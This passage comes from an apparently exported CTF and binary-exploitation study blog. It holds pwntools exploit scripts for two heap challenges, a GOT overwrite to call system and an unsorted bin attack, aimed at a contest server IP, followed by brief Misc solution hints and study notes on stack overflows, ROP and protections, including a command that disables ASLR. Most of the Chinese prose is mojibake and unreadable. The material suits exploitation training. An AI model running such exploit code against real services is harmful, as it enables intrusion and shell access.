<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10015</span>)</span><br><span class="line">heap = ELF(<span class="string">'./pwn6'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = heap.got[<span class="string">'free'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>) <span class="comment">#1</span></span><br><span class="line">change(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x20</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr -libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">change(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn7-fail"><a href="#pwn7-fail" class="headerlink" title="pwn7(fail)"></a>pwn7(fail)</h3><blockquote>
<p>å¾ˆç®€å•çš„unsorted bin attack,åˆ©ç”¨æ­¤æ”»å‡»ä¿®æ”¹flagä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°å°±å¯ä»¥è·å¾—shelläº†</p>
<p>å…³äºunsorted bin attackå¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10016</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#def show(idx):</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline("3")</span></span><br><span class="line"><span class="comment">#    r.recvuntil(":")</span></span><br><span class="line"><span class="comment">#    r.sendline(str(idx))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">"AAAA"</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x6020a0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = flag - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x20</span> + <span class="number">0x20</span>, <span class="string">"a"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="number">0x80</span>, <span class="string">"AAAA"</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"666"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="pwn8-fail"><a href="#pwn8-fail" class="headerlink" title="pwn8(fail)"></a>pwn8(fail)</h3><blockquote>
<p>addç”³è¯·çš„æ—¶å€™,å¦‚æœsizeä¸ç¬¦åˆæ¡ä»¶,ä¼šè¿”å›,è€Œeditçš„æ—¶å€™,æ²¡æœ‰æ£€æµ‹,æ‰€ä»¥é€šè¿‡æ®‹ç•™ä¿¡æ¯æ¥æ§åˆ¶æŒ‡é’ˆ,å®ç°</p>
<p>ä»»æ„å†™</p>
</blockquote>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="MISCç­¾åˆ°é¢˜"><a href="#MISCç­¾åˆ°é¢˜" class="headerlink" title="MISCç­¾åˆ°é¢˜"></a>MISCç­¾åˆ°é¢˜</h3><p>ookè§£ç </p>
<h3 id="åŒé‡æ´—è„‘"><a href="#åŒé‡æ´—è„‘" class="headerlink" title="åŒé‡æ´—è„‘"></a>åŒé‡æ´—è„‘</h3><p>ä¸ä½›è®ºç¦…+ç¤¾ä¼šä¸»ä¹‰ä»·å€¼è§‚</p>
<h3 id="çœŸÂ·ç­¾åˆ°"><a href="#çœŸÂ·ç­¾åˆ°" class="headerlink" title="çœŸÂ·ç­¾åˆ°"></a>çœŸÂ·ç­¾åˆ°</h3><p>åŠ qqæ‹ä¸€æ‹</p>
<h3 id="çŒœçŒœå¯è‰æŠŠflagè—åˆ°å“ªäº†"><a href="#çŒœçŒœå¯è‰æŠŠflagè—åˆ°å“ªäº†" class="headerlink" title="çŒœçŒœå¯è‰æŠŠflagè—åˆ°å“ªäº†"></a>çŒœçŒœå¯è‰æŠŠflagè—åˆ°å“ªäº†</h3><p>è„±è¿›010ï¼Œç›´æ¥ç›²æ–‡è§£å¯†</p>
<h3 id="7çš„æ„å¿—ï¼"><a href="#7çš„æ„å¿—ï¼" class="headerlink" title="7çš„æ„å¿—ï¼"></a>7çš„æ„å¿—ï¼</h3><p>å‹ç¼©åŒ…å¯†ç 7</p>
<p>æ …æ åŠ å‡¯æ’’</p>
<h3 id="å¥‡æ€ªçš„é¢˜"><a href="#å¥‡æ€ªçš„é¢˜" class="headerlink" title="å¥‡æ€ªçš„é¢˜"></a>å¥‡æ€ªçš„é¢˜</h3><p>æ”¹åƒç´ å¯ä»¥å¾—åˆ°ä¸€å¼ æ•£å¼€çš„äºŒç»´ç </p>
<p>æŠŠä¸‰ä¸ªæ‹¼ä¸€ä¸ªäºŒç»´ç </p>
<p>è¡¥ä¸‰ä¸ªå®šä½ç¬¦</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>0dayå®‰å…¨è¯»ä¹¦ç¬”è®°</title>
    <url>/2020/10/27/0day%E5%AE%89%E5%85%A8%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸‰ä¸ªæœˆä¸€èµ·è¯»å®Œ0dayå®‰å…¨ï¼Œèµ¶ç´§æ‹¿æ¥è¯»ä¸€è¯»ï¼Œéšç¼˜æ›´æ–°</p>
<h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1>]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†è¯»ä¹¦ç¬”è®°</title>
    <url>/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é¢„ä¼°ä¸‰ä¸ªæœˆï¼Œä½†è¯´ä¸å®šä¸ºäº†èµ¶å…¶ä»–çš„ddlï¼Œä¹Ÿå°±è¯»ä¸å®Œäº†ï¼Œå°½åŠ›å»å§</p>
<h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1>]]></content>
      <categories>
        <category>é€†å‘</category>
      </categories>
      <tags>
        <tag>é€†å‘</tag>
        <tag>è¯»ä¹¦ç¬”è®°</tag>
      </tags>
  </entry>
  <entry>
    <title>PWNå­¦ä¹ </title>
    <url>/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p>çº¯é›¶åŸºç¡€ï¼Œå¤§ä½¬è¯·ç•¥è¿‡</p>
<p>ä»é›¶å¼€å§‹å­¦ä¹ PWN,Webä¼šå»å­¦ï¼Œä½†å¯èƒ½ç°åœ¨å¤§éƒ¨åˆ†æ—¶é—´ä¼šç”¨åœ¨PWNä¸Šï¼Œå¦‚æœéœ€è¦é¢˜çš„è¯å¯ä»¥è¯„è®º</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/1603543652982.jpeg" alt="1603543652982"></p>
<p>å¤§å­¦ä¸­æ˜¯ç ”ç©¶æ·±åº¦è¿˜æ˜¯å¹¿åº¦ï¼Œæˆ‘å¯èƒ½è¿˜æ˜¯éœ€è¦é€‰æ‹©ä¸€ä¸‹</p>
<p>åŸºæœ¬å…¨æ˜¯pptæˆªå›¾</p>
<h1 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201024233545234.png" alt="image-20201024233545234"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -S a.c #ç”Ÿæˆæ±‡ç¼–æ–‡ä»¶</span><br><span class="line">file a.s #æŸ¥çœ‹æ–‡ä»¶ç±»å‹  å¯ä»¥çœ‹è§æ˜¯asciiæ–‡æœ¬</span><br><span class="line">gcc a.s  #ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">file a.out #å¯ä»¥çœ‹è§æ˜¯å¯æ‰§è¡Œæ–‡ä»¶</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230103100.png" alt="image-20201027230103100"></p>
<h2 id="ELFæ–‡ä»¶"><a href="#ELFæ–‡ä»¶" class="headerlink" title="ELFæ–‡ä»¶"></a>ELFæ–‡ä»¶</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201027230424200.png" alt="image-20201027230424200"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164523021.png" alt="image-20201028164523021"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028164758641.png" alt="image-20201028164758641"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028165455072.png" alt="image-20201028165455072"></p>
<h2 id="è™šæ‹Ÿå†…å­˜"><a href="#è™šæ‹Ÿå†…å­˜" class="headerlink" title="è™šæ‹Ÿå†…å­˜"></a>è™šæ‹Ÿå†…å­˜</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028170244054.png" alt="image-20201028170244054"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028171316681.png" alt="image-20201028171316681"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175015154.png" alt="image-20201028175015154"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175324930.png" alt="image-20201028175324930"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028175515114.png" alt="image-20201028175515114"></p>
<h2 id="ç¨‹åºç¼–è¯‘ä¸é“¾æ¥"><a href="#ç¨‹åºç¼–è¯‘ä¸é“¾æ¥" class="headerlink" title="ç¨‹åºç¼–è¯‘ä¸é“¾æ¥"></a>ç¨‹åºç¼–è¯‘ä¸é“¾æ¥</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180055683.png" alt="image-20201028180055683"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028180509024.png" alt="image-20201028180509024"></p>
<h2 id="ç¨‹åºè£…è½½ä¸è¿›ç¨‹æ‰§è¡Œ"><a href="#ç¨‹åºè£…è½½ä¸è¿›ç¨‹æ‰§è¡Œ" class="headerlink" title="ç¨‹åºè£…è½½ä¸è¿›ç¨‹æ‰§è¡Œ"></a>ç¨‹åºè£…è½½ä¸è¿›ç¨‹æ‰§è¡Œ</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028181509843.png" alt="image-20201028181509843"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182158445.png" alt="image-20201028182158445"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182509458.png" alt="image-20201028182509458"></p>
<h2 id="æ±‡ç¼–æŒ‡ä»¤"><a href="#æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="æ±‡ç¼–æŒ‡ä»¤"></a>æ±‡ç¼–æŒ‡ä»¤</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028182719496.png" alt="image-20201028182719496"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183231684.png" alt="image-20201028183231684"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183244082.png" alt="image-20201028183244082"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028183715008.png" alt="image-20201028183715008"></p>
<h1 id="æ ˆæº¢å‡ºåŸºç¡€"><a href="#æ ˆæº¢å‡ºåŸºç¡€" class="headerlink" title="æ ˆæº¢å‡ºåŸºç¡€"></a>æ ˆæº¢å‡ºåŸºç¡€</h1><h2 id="åŸºæœ¬åŸç†"><a href="#åŸºæœ¬åŸç†" class="headerlink" title="åŸºæœ¬åŸç†"></a><strong>åŸºæœ¬åŸç†</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210304426.png" alt="image-20201028210304426"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028210843823.png" alt="image-20201028210843823"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212002026.png" alt="image-20201028212002026"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212037049.png" alt="image-20201028212037049"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212448211.png" alt="image-20201028212448211"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028212603675.png" alt="image-20201028212603675"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213307651.png" alt="image-20201028213307651"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213458423.png" alt="image-20201028213458423"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213648493.png" alt="image-20201028213648493"></p>
<h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a><strong>å®ä¾‹</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028213849813.png" alt="image-20201028213849813"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215303342.png" alt="image-20201028215303342"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029211445528.png" alt="image-20201029211445528"></p>
<h2 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a><strong>æ”»å‡»</strong></h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028215837467.png" alt="image-20201028215837467"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201028220533860.png" alt="image-20201028220533860"></p>
<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>è¿”å›åœ°å€ä¸ºåé—¨åœ°å€</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201029210250310.png" alt="image-20201029210250310"></p>
<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>è¿”å›åœ°å€ä¸ºå†™å…¥çš„shellcodeçš„åœ°å€</p>
<p><strong>æ ˆä¸­å†™å…¥shellcode</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103230658840.png" alt="image-20201103230658840"></p>
<p><strong>bssæ®µå†™å…¥shellcode</strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103232118467.png" alt="image-20201103232118467"></p>
<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231611494.png" alt="image-20201103231611494"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111165405311.png" alt="image-20201111165405311"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201111170622828.png" alt="image-20201111170622828"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112200053036.png" alt="image-20201112200053036"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112201440668.png" alt="image-20201112201440668"></p>
<h1 id="è¿”å›å¯¼å‘ç¼–ç¨‹"><a href="#è¿”å›å¯¼å‘ç¼–ç¨‹" class="headerlink" title="è¿”å›å¯¼å‘ç¼–ç¨‹"></a>è¿”å›å¯¼å‘ç¼–ç¨‹</h1><h2 id="åŸºç¡€-1"><a href="#åŸºç¡€-1" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105154134220.png" alt="image-20201105154134220"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105160249721.png" alt="image-20201105160249721"></p>
<h2 id="æ”»å‡»-1"><a href="#æ”»å‡»-1" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h2><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105191117470.png" alt="image-20201105191117470"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105192140397.png" alt="image-20201105192140397"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105193656915.png" alt="image-20201105193656915"></p>
<p><strong>è°ƒç”¨æ„é€ </strong></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201105200045153.png" alt="image-20201105200045153"></p>
<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>å­˜æ”¾å‚æ•°æ”¾å…¥å¯„å­˜å™¨ä¸­</p>
<p>ä½†è¶…è¿‡6ä¸ªå°±ä¼šæ”¾å…¥æ ˆä¸­</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201115233600880.png" alt="image-20201115233600880"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116194218608.png" alt="image-20201116194218608"></p>
<h1 id="åŠ¨æ€é“¾æ¥è¿‡ç¨‹"><a href="#åŠ¨æ€é“¾æ¥è¿‡ç¨‹" class="headerlink" title="åŠ¨æ€é“¾æ¥è¿‡ç¨‹"></a>åŠ¨æ€é“¾æ¥è¿‡ç¨‹</h1><p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106223140061.png" alt="image-20201106223140061"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106232428225.png" alt="image-20201106232428225"></p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201106233935531.png" alt="image-20201106233935531"></p>
<h1 id="ä¿æŠ¤æªæ–½"><a href="#ä¿æŠ¤æªæ–½" class="headerlink" title="ä¿æŠ¤æªæ–½"></a>ä¿æŠ¤æªæ–½</h1><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>Relocation Read-Only </p>
<p>å®ƒåˆ†ä¸ºä¸¤ç§ï¼ŒPartial RELRO å’Œ Full RELROï¼Œå³ éƒ¨åˆ†RELRO å’Œ å®Œå…¨RELROã€‚</p>
<p><strong>éƒ¨åˆ†RELRO</strong> æ˜¯ GCC çš„é»˜è®¤è®¾ç½®ï¼Œå‡ ä¹æ‰€æœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶éƒ½è‡³å°‘ä½¿ç”¨ éƒ¨åˆ†RELROã€‚ä½†æ˜¯ä»æ”»å‡»è€…è§’åº¦æ¥çœ‹å‘¢ï¼Œéƒ¨åˆ†RELRO ä¸å ªä¸€å‡»ï¼Œå› ä¸ºå®ƒä»…ä»…ä½¿ GOT å­˜å‚¨åœ¨ bss æ®µä¹‹å‰ï¼Œè¿™æ ·ä»…ä»…åªèƒ½é˜²æ­¢å…¨å±€å˜é‡ä¸Šçš„ç¼“å†²åŒºæº¢å‡ºä»è€Œè¦†ç›– GOTã€‚<br><strong>å®Œå…¨RELRO</strong> ä½¿æ•´ä¸ª GOT åªè¯»ï¼Œä»è€Œæ— æ³•è¢«è¦†ç›–ï¼Œä½†è¿™æ ·ä¼šå¤§å¤§å¢åŠ ç¨‹åºçš„å¯åŠ¨æ—¶é—´ï¼Œå› ä¸ºç¨‹åºåœ¨å¯åŠ¨ä¹‹å‰éœ€è¦è§£ææ‰€æœ‰çš„ç¬¦å·ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o a a.c // é»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜¯Partial RELRO</span><br><span class="line">gcc -z norelro -o a a.c // å…³é—­ï¼Œå³No RELRO</span><br><span class="line">gcc -z lazy -o a a.c // éƒ¨åˆ†å¼€å¯ï¼Œå³Partial RELRO</span><br><span class="line">gcc -z now -o a a.c // å…¨éƒ¨å¼€å¯ï¼Œå³Full RELRO</span><br></pre></td></tr></table></figure>
<h2 id="The-NX-bits"><a href="#The-NX-bits" class="headerlink" title="The NX bits"></a>The NX bits</h2><p>ä¸»è¦æ˜¯ä¿æŠ¤æ ˆåŒºä¸å¯æ‰§è¡Œï¼Œé€šå¸¸åœ¨checksecä¸­å¯ä»¥æŸ¥çœ‹</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231211223.png" alt="image-20201103231211223"></p>
<h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><p>åœ°å€éšæœºåŒ–ï¼Œä¹Ÿå¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯ä¸æƒ³è®©ä½ æ‰¾åˆ°çœŸæ­£çš„å†…å­˜åœ°å€</p>
<p><img src="/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201103231430738.png" alt="image-20201103231430738"></p>
<p>æ”¹å˜å€¼çš„å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -s <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
<p><strong>ASLR å¹¶ä¸è´Ÿè´£ä»£ç æ®µå’Œæ•°æ®æ®µçš„éšæœºåŒ–ï¼Œè¿™ç”± PIE è´Ÿè´£ï¼Œä½†æ˜¯åªæœ‰åœ¨å¼€å¯ ASLR ä¹‹åï¼ŒPIE æ‰ä¼šç”Ÿæ•ˆã€‚</strong></p>
<h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><p><strong>è¿™ç§æ ˆä¿æŠ¤æªæ–½åœ¨æ ˆå¸§ä¸­ä»»ä½•å±€éƒ¨ç¼“å†²åŒºä¸æ ˆçŠ¶æ€ä¹‹é—´å­˜å‚¨ä¸€ä¸ªç‰¹æ®Šçš„é‡‘ä¸é›€å€¼</strong>ï¼Œ</p>
<p>ä¹Ÿç§°å“¨å…µå€¼ï¼Œé€šä¿—ç†è§£ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒçœ‹æˆä¸€ä¸ªcookie</p>
<p>å®ƒæ˜¯ç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶éšæœºäº§ç”Ÿçš„ã€‚</p>
<p>åœ¨æ¢å¤å¯„å­˜å™¨çŠ¶æ€ä¹‹å‰å’Œä»å‡½æ•°è¿”å›ä¹‹å‰ï¼Œç¨‹åºæ£€æŸ¥è¿™ä¸ªé‡‘ä¸é›€å€¼æ˜¯å¦è¢«è¯¥å‡½æ•°çš„æŸä¸ªæ“ä½œæˆ–è€…è¯¥å‡½æ•°è°ƒç”¨çš„æŸä¸ªå‡½æ•°çš„æŸä¸ªæ“ä½œæ”¹å˜äº†ï¼Œå¦‚æœå‘ç°å¼‚å¸¸ç¨‹åºä¼šä¸­æ­¢ã€‚<br>æœ€è¿‘çš„ GCC ç‰ˆæœ¬å¯èƒ½ä¼šè¯•å›¾è‡ªåŠ¨æ’å…¥è¿™ç§æº¢å‡ºæ£€æµ‹å€¼ã€‚</p>
